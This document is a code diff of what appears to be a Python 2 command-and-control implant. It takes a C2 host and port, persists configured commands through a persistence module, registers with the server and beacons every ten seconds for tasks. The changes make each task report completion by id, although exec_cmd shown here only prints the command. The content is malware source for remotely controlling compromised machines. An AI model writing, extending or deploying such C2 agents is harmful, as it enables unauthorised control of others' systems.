@@ -7,10 +7,12 @@ from .lib.persistance import PersistenceMGMT
 from .db.SQLite import Helper
 from .settings import commands
 
+
 def parse_args():
     parser = argparse.ArgumentParser()
     parser.add_argument('--c2-host', action='store', dest='host', help='Change the c2 node hostname')
-    parser.add_argument('--c2-port', action='store', dest='port', default=8000, help='Set port for C2 server, defaults to 8000')
+    parser.add_argument('--c2-port', action='store', dest='port', default=8000,
+                        help='Set port for C2 server, defaults to 8000')
     args = parser.parse_args()
     return args
 
@@ -32,10 +34,15 @@ def init():
         for command in commands:
             print "[+] Persisting %s" % command
             persistence.persist(command)
+
     run()
 
-def exec_cmd(cmd):
+
+def exec_cmd(cmd, cmd_id):
+    rest = Rester()
     print cmd
+    rest.commandComplete(cmd_id)
+
 
 def api_loop():
     from time import sleep
@@ -43,7 +50,7 @@ def api_loop():
     rest.register()
     while True:
         cmds = rest.beacon()
-        map(lambda cmd: exec_cmd(cmd['cmd']), cmds)
+        map(lambda cmd: exec_cmd(cmd['cmd'], cmd['id']), cmds)
         sleep(10)
 
 
